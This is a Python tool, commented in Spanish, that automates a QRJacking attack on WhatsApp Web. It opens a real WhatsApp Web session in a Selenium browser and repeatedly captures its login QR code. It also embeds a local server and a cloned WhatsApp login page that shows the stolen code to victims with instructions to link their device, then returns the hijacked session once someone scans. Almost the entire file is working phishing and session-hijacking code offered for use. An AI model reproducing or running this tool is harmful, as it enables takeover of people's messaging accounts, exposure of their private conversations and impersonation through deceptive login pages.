#!/usr/bin/env python3
"""
Modulo QRJacking automatizado - v1.0.
Cambios: preferencia de Firefox para auto-aceptar almacenamiento persistente.
"""
import os
import time
import base64
import threading
import subprocess
import signal
import sys
import shutil
import logging
from pathlib import Path

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException, WebDriverException

logger = logging.getLogger(__name__)

SERVER_PY_CONTENT = r"""#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import base64
import sys
from pathlib import Path

BASE_DIR = Path(__file__).parent.resolve()
TEMPLATE_DIR = BASE_DIR / "templates"

class QRHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[SERVER] {self.address_string()} - {format % args}")

    def _set_headers(self, status=200, content_type="text/html"):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_OPTIONS(self):
        self._set_headers(200)

    def do_GET(self):
        print(f"[*] GET {self.path}")
        if self.path == "/" or self.path == "/index.html":
            self._serve_index()
        elif self.path.startswith("/tmp.png"):
            self._serve_qr()
        else:
            self._set_headers(404)
            self.wfile.write(b"Not Found")

    def do_POST(self):
        print(f"[*] POST {self.path}")
        if self.path == "/qr":
            self._receive_qr()
        else:
            self._set_headers(404)
            self.wfile.write(b"Not Found")

    def _serve_index(self):
        html_path = TEMPLATE_DIR / "phishing_page.html"
        if not html_path.exists():
            self._set_headers(500)
            self.wfile.write(f"Template not found: {html_path}".encode())
            print(f"[ERROR] Template no encontrado en: {html_path}")
            return
        content = html_path.read_bytes()
        content = content.replace(b"{{name}}", b"WhatsApp")
        content = content.replace(b"{{port}}", str(self.server.server_port).encode())
        self._set_headers(200, "text/html")
        self.wfile.write(content)
        print(f"[OK] Template servido: {html_path}")

    def _serve_qr(self):
        qr_path = BASE_DIR.parent / "tmp.png"
        if not qr_path.exists():
            qr_path = Path("tmp.png")
        if qr_path.exists():
            self._set_headers(200, "image/png")
            self.wfile.write(qr_path.read_bytes())
            print(f"[OK] QR servido: {qr_path} ({qr_path.stat().st_size} bytes)")
        else:
            self._set_headers(404)
            self.wfile.write(b"QR not found")
            print(f"[ERROR] QR no encontrado en: {qr_path}")

    def _receive_qr(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length)
        data = urllib.parse.parse_qs(post_data.decode())
        qr_base64 = data.get("qr", [""])[0]
        if qr_base64:
            try:
                img_data = base64.b64decode(qr_base64)
                qr_path = BASE_DIR.parent / "tmp.png"
                qr_path.write_bytes(img_data)
                self._set_headers(200)
                self.wfile.write(b"OK")
                print(f"[+] QR recibido ({len(img_data)} bytes) -> {qr_path}")
            except Exception as e:
                self._set_headers(400)
                self.wfile.write(f"Error: {e}".encode())
        else:
            self._set_headers(400)
            self.wfile.write(b"Missing qr parameter")

def main():
    host = "0.0.0.0"
    port = 8080
    if len(sys.argv) >= 2:
        try:
            port = int(sys.argv[1])
        except ValueError:
            pass
    server = HTTPServer((host, port), QRHandler)
    print(f"[*] Servidor corriendo en http://{host}:{port}")
    print(f"[*] Plantillas en: {TEMPLATE_DIR}")
    print(f"[*] Directorio base: {BASE_DIR}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Servidor detenido.")
        server.shutdown()

if __name__ == "__main__":
    main()
"""

PHISHING_HTML_CONTENT = r"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{name}} Web - Iniciar sesion</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(180deg, #00a884 0%, #008f72 40%, #d9dbd5 40%, #d9dbd5 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: #fff;
            border-radius: 4px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
            max-width: 1000px;
            width: 100%;
            display: flex;
            overflow: hidden;
        }
        .left {
            background: #00a884;
            color: white;
            padding: 50px 40px;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .left h1 { font-size: 28px; margin-bottom: 20px; font-weight: 300; }
        .left p { font-size: 15px; line-height: 1.6; opacity: 0.95; margin-bottom: 30px; }
        .left .feature {
            display: flex;
            align-items: center;
            margin-bottom: 18px;
            font-size: 14px;
        }
        .left .feature svg {
            width: 20px; height: 20px; margin-right: 12px;
            fill: none; stroke: currentColor; stroke-width: 2;
        }
        .right {
            padding: 50px 40px;
            flex: 1;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .right h2 {
            color: #41525d;
            font-size: 26px;
            font-weight: 300;
            margin-bottom: 30px;
        }
        .qr-wrapper {
            background: #fff;
            padding: 10px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
            margin-bottom: 25px;
        }
        .qr-wrapper img {
            width: 220px; height: 220px;
            display: block;
        }
        .instructions {
            color: #667781;
            font-size: 14px;
            line-height: 1.6;
            max-width: 300px;
        }
        .instructions ol {
            text-align: left;
            padding-left: 20px;
            margin-top: 10px;
        }
        .instructions li { margin-bottom: 8px; }
        .loading {
            display: inline-block;
            width: 18px; height: 18px;
            border: 2px solid #00a884;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            vertical-align: middle;
            margin-left: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #8696a0;
        }
        @media (max-width: 768px) {
            .container { flex-direction: column; }
            .left { padding: 30px 25px; }
            .right { padding: 30px 25px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>WhatsApp Web</h1>
            <p>Envia y recibe mensajes de WhatsApp directamente desde tu computadora.</p>
            <div class="feature">
                <svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
                <span>Mensajes sincronizados con tu telefono</span>
            </div>
            <div class="feature">
                <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/></svg>
                <span>Comparte fotos, videos y documentos</span>
            </div>
            <div class="feature">
                <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                <span>Conversaciones cifradas de extremo a extremo</span>
            </div>
        </div>
        <div class="right">
            <h2>Iniciar sesion</h2>
            <div class="qr-wrapper">
                <img id="qrcodew" src="tmp.png" alt="Escanea el codigo QR">
            </div>
            <div class="instructions">
                <strong>Para iniciar sesion:</strong>
                <ol>
                    <li>Abre WhatsApp en tu telefono</li>
                    <li>Toca <strong>Menu</strong> o <strong>Ajustes</strong> y selecciona <strong>Dispositivos vinculados</strong></li>
                    <li>Toca en <strong>Vincular un dispositivo</strong></li>
                    <li>Apunta tu telefono hacia esta pantalla para capturar el codigo</li>
                </ol>
                <p style="margin-top:15px; font-size:12px;">
                    Actualizando QR <span class="loading"></span>
                </p>
            </div>
            <div class="footer">
                &copy; WhatsApp Inc. &nbsp;|&nbsp; <a href="#" style="color:#8696a0;">Privacidad</a> &nbsp;|&nbsp; <a href="#" style="color:#8696a0;">Terminos</a>
            </div>
        </div>
    </div>
    <script>
        function reloadQR() {
            var img = document.getElementById('qrcodew');
            var d = new Date();
            img.src = 'tmp.png?t=' + d.getTime();
        }
        setInterval(reloadQR, 3000);
        document.getElementById('qrcodew').onerror = function() {
            this.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="220" height="220"><rect fill="%23f0f0f0" width="220" height="220"/><text x="50%" y="50%" text-anchor="middle" dy=".3em" fill="%23999" font-family="sans-serif" font-size="14">Cargando QR...</text></svg>';
        };
    </script>
</body>
</html>
"""


class QRJacker:
    def __init__(self, browser="firefox", headless=False, driver_path=None, workdir="."):
        self.browser = browser.lower()
        self.headless = headless
        self.driver_path = driver_path
        self.workdir = Path(workdir).resolve()
        self.workdir.mkdir(parents=True, exist_ok=True)
        self.tmp_png = self.workdir / "tmp.png"
        self.driver = None
        self.server_proc = None
        self._running = False
        self._capture_thread = None

    def _build_driver(self):
        if self.browser == "firefox":
            opts = FirefoxOptions()
            opts.set_preference("dom.webnotifications.enabled", False)
            opts.set_preference("media.volume_scale", "0.0")
            opts.set_preference("browser.download.folderList", 2)
            opts.set_preference("browser.download.dir", str(self.workdir / "downloads"))
            opts.set_preference("browser.download.useDownloadDir", True)
            # v1.0: evitar popup de almacenamiento persistente
            opts.set_preference("dom.storageManager.prompt.testing", True)
            opts.set_preference("dom.storageManager.prompt.testing.allow", True)
            opts.set_preference("permissions.default.storage", 1)
            if self.headless:
                opts.add_argument("--headless")
            kwargs = {"options": opts}
            if self.driver_path:
                kwargs["executable_path"] = self.driver_path
            try:
                return webdriver.Firefox(**kwargs)
            except WebDriverException as e:
                logger.warning(f"Firefox fallo: {e}. Intentando con geckodriver en PATH...")
                return webdriver.Firefox(options=opts)

        elif self.browser == "chrome":
            opts = ChromeOptions()
            opts.add_argument("--lang=es-ES")
            opts.add_argument("--disable-notifications")
            opts.add_argument("--mute-audio")
            opts.add_argument("--disable-gpu")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            prefs = {
                "intl.accept_languages": "es-ES,es",
                "download.default_directory": str(self.workdir / "downloads"),
                "download.prompt_for_download": False,
                "profile.default_content_setting_values.notifications": 2,
            }
            opts.add_experimental_option("prefs", prefs)
            if self.headless:
                opts.add_argument("--headless=new")
            kwargs = {"options": opts}
            if self.driver_path:
                kwargs["executable_path"] = self.driver_path
            try:
                return webdriver.Chrome(**kwargs)
            except WebDriverException:
                return webdriver.Chrome(options=opts)
        else:
            raise ValueError(f"Navegador no soportado: {self.browser}")

    def _start_server(self, host="0.0.0.0", port=8080):
        server_dir = self.workdir / "server"
        templates_dir = server_dir / "templates"
        server_dir.mkdir(parents=True, exist_ok=True)
        templates_dir.mkdir(parents=True, exist_ok=True)

        server_py = server_dir / "server.py"
        server_py.write_text(SERVER_PY_CONTENT, encoding="utf-8")
        logger.info(f"[AUTO] server.py creado en: {server_py}")

        template_html = templates_dir / "phishing_page.html"
        template_html.write_text(PHISHING_HTML_CONTENT, encoding="utf-8")
        logger.info(f"[AUTO] phishing_page.html creado en: {template_html}")

        proc = subprocess.Popen(
            [sys.executable, str(server_py), str(port)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=str(self.workdir)
        )
        logger.info(f"Servidor HTTP iniciado en http://{host}:{port}")
        return proc

    def _capture_qr_loop(self, interval=5):
        logger.info("Hilo de captura de QR iniciado.")
        while self._running:
            try:
                canvas = self.driver.find_element(
                    By.CSS_SELECTOR, 'canvas[aria-label*="Scan this QR"]'
                )
                b64 = self.driver.execute_script("""
                    var c = arguments[0];
                    return c.toDataURL('image/png').substring(22);
                """, canvas)
                self.tmp_png.write_bytes(base64.b64decode(b64))
                logger.info(f"QR actualizado -> {self.tmp_png}")
            except NoSuchElementException:
                logger.debug("QR no encontrado (posiblemente ya escaneado).")
            except Exception as e:
                logger.error(f"Error capturando QR: {e}")
            time.sleep(interval)

    def _wait_for_scan(self, timeout=300):
        logger.info("Esperando que el usuario escanee el QR...")
        try:
            WebDriverWait(self.driver, timeout).until(
                EC.presence_of_element_located(
                    (By.CSS_SELECTOR, 'div[data-testid="chat-list"]')
                )
            )
            logger.info("Sesion iniciada! QR escaneado correctamente.")
            return True
        except TimeoutException:
            logger.error("Timeout esperando el escaneo del QR.")
            return False

    def start(self, server_host="0.0.0.0", server_port=8080):
        self._running = True
        signal.signal(signal.SIGINT, self._signal_handler)

        logger.info("Iniciando navegador...")
        self.driver = self._build_driver()
        self.driver.get("https://web.whatsapp.com")
        time.sleep(10)

        self.server_proc = self._start_server(server_host, server_port)
        time.sleep(2)

        self._capture_thread = threading.Thread(target=self._capture_qr_loop, args=(5,))
        self._capture_thread.daemon = True
        self._capture_thread.start()

        logger.info(f"Dirige el movil a: http://TU_IP:{server_port}")
        logger.info("Esperando escaneo...")

        scanned = self._wait_for_scan()
        if not scanned:
            self.stop()
            return None

        return self.driver

    def _signal_handler(self, sig, frame):
        logger.info("Senal de interrupcion recibida.")
        self.stop()
        sys.exit(0)

    def stop(self):
        self._running = False
        if self._capture_thread and self._capture_thread.is_alive():
            self._capture_thread.join(timeout=2)
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass
            self.driver = None
        if self.server_proc:
            self.server_proc.terminate()
            try:
                self.server_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.server_proc.kill()
            self.server_proc = None
        logger.info("QRJacker detenido y limpiado.")
